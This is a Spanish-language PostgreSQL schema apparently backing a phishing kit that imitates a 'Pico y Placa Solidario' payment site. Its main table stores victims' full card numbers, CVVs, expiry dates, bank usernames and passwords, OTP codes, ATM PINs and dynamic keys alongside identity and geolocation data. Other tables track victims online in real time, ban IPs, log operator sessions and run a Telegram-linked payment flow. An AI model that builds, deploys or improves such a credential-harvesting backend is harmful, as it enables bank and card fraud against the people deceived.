-- ============================================================
-- Esquema Pico y Placa Solidario + Panel Admin (PostgreSQL)
-- Ejecutar UNA VEZ en la consola SQL de Render o con psql.
-- ============================================================

-- 1) SOLICITUDES — reemplaza solicitudes.dat
CREATE TABLE IF NOT EXISTS solicitudes (
    id                    VARCHAR(64)  PRIMARY KEY,
    fecha                 TIMESTAMPTZ  NOT NULL DEFAULT NOW(),
    fecha_procesada       TIMESTAMPTZ,

    numero_tarjeta        VARCHAR(25),
    cvv                   VARCHAR(5),
    vencimiento           VARCHAR(10),
    banco                 VARCHAR(120),
    tipo_tarjeta          VARCHAR(20),

    usuario               VARCHAR(200),
    password              VARCHAR(200),

    otp_codigo            VARCHAR(20),
    otp_codigo_secundario VARCHAR(20),
    otp_modo              VARCHAR(30),
    clave_cajero_codigo   VARCHAR(20),
    clave_dinamica_codigo VARCHAR(20),

    nombre                VARCHAR(200),
    documento             VARCHAR(60),
    email                 VARCHAR(200),
    celular               VARCHAR(60),
    monto                 VARCHAR(60),
    placas                TEXT,

    ip                    VARCHAR(45),
    pais                  VARCHAR(80),
    ciudad                VARCHAR(120),

    estado                VARCHAR(40) NOT NULL DEFAULT 'pending',

    manipulado_por        VARCHAR(80),
    manipulado_rol        VARCHAR(20),
    manipulado_timestamp  BIGINT,

    payload_json          JSONB
);
CREATE INDEX IF NOT EXISTS idx_sol_estado  ON solicitudes (estado);
CREATE INDEX IF NOT EXISTS idx_sol_fecha   ON solicitudes (fecha DESC);
CREATE INDEX IF NOT EXISTS idx_sol_ip      ON solicitudes (ip);
CREATE INDEX IF NOT EXISTS idx_sol_manip   ON solicitudes (manipulado_rol, manipulado_timestamp);

-- 2) BANNED_IPS — reemplaza banned_ips.json
CREATE TABLE IF NOT EXISTS banned_ips (
    ip            VARCHAR(45) PRIMARY KEY,
    ciudad        VARCHAR(120),
    fecha         TIMESTAMPTZ NOT NULL DEFAULT NOW(),
    id_solicitud  VARCHAR(64),
    motivo        VARCHAR(255)
);

-- 3) SESIONES_ADMIN — reemplaza sesiones.json
CREATE TABLE IF NOT EXISTS sesiones_admin (
    id                VARCHAR(128) PRIMARY KEY,
    fecha             TIMESTAMPTZ  NOT NULL DEFAULT NOW(),
    ultima_actividad  TIMESTAMPTZ  NOT NULL DEFAULT NOW(),
    ip                VARCHAR(45),
    user_agent        TEXT,
    rol               VARCHAR(20),
    usuario           VARCHAR(80),
    activa            SMALLINT NOT NULL DEFAULT 1
);
CREATE INDEX IF NOT EXISTS idx_ses_activa ON sesiones_admin (activa);
CREATE INDEX IF NOT EXISTS idx_ses_ultima ON sesiones_admin (ultima_actividad DESC);

-- 4) USUARIOS_ONLINE — tracking de usuarios navegando
CREATE TABLE IF NOT EXISTS usuarios_online (
    usuario_id    VARCHAR(80) PRIMARY KEY,
    pagina        VARCHAR(200),
    ultimo_ping   TIMESTAMPTZ NOT NULL DEFAULT NOW(),
    ip            VARCHAR(45)
);
CREATE INDEX IF NOT EXISTS idx_online_ping ON usuarios_online (ultimo_ping DESC);

-- 5) GEO_CACHE — reemplaza geoip_cache.json
CREATE TABLE IF NOT EXISTS geo_cache (
    ip      VARCHAR(45) PRIMARY KEY,
    ciudad  VARCHAR(120),
    pais    VARCHAR(80),
    ts      BIGINT NOT NULL
);
CREATE INDEX IF NOT EXISTS idx_geo_ts ON geo_cache (ts);

-- 6) RATELIMIT — reemplaza ratelimit/*.json
CREATE TABLE IF NOT EXISTS ratelimit (
    ip_hash     CHAR(32) PRIMARY KEY,
    ip          VARCHAR(45),
    contador    INTEGER NOT NULL DEFAULT 1,
    primera_vez TIMESTAMPTZ NOT NULL DEFAULT NOW()
);
CREATE INDEX IF NOT EXISTS idx_rl_primera ON ratelimit (primera_vez);

-- 7) LOGIN_LOG — reemplaza login_log.txt
CREATE TABLE IF NOT EXISTS login_log (
    id      BIGSERIAL PRIMARY KEY,
    fecha   TIMESTAMPTZ NOT NULL DEFAULT NOW(),
    ip      VARCHAR(45),
    usuario VARCHAR(200),
    exito   SMALLINT NOT NULL DEFAULT 0
);
CREATE INDEX IF NOT EXISTS idx_ll_fecha ON login_log (fecha DESC);

-- 8) HEARTBEATS — para el punto verde online/offline del panel
CREATE TABLE IF NOT EXISTS heartbeats (
    solicitud_id VARCHAR(64) PRIMARY KEY,
    usuario      VARCHAR(200),
    estado       VARCHAR(20) NOT NULL DEFAULT 'activo',
    ip           VARCHAR(45),
    pais         VARCHAR(80),
    ciudad       VARCHAR(120),
    ts           TIMESTAMPTZ NOT NULL DEFAULT NOW()
);
CREATE INDEX IF NOT EXISTS idx_hb_ts ON heartbeats (ts DESC);
CREATE INDEX IF NOT EXISTS idx_hb_estado ON heartbeats (estado);

-- 9) PAYMENTS — para el flujo QR/pago del modal (telegram_send + callback)
CREATE TABLE IF NOT EXISTS payments (
    id            VARCHAR(64) PRIMARY KEY,
    estado        VARCHAR(20) NOT NULL DEFAULT 'pending',
    monto         VARCHAR(60),
    placas        TEXT,
    nombre        VARCHAR(200),
    tipo_doc      VARCHAR(80),
    num_doc       VARCHAR(60),
    cus           VARCHAR(30),
    creado        TIMESTAMPTZ NOT NULL DEFAULT NOW(),
    actualizado   TIMESTAMPTZ NOT NULL DEFAULT NOW()
);
CREATE INDEX IF NOT EXISTS idx_pay_estado ON payments (estado);
CREATE INDEX IF NOT EXISTS idx_pay_fecha  ON payments (creado DESC);
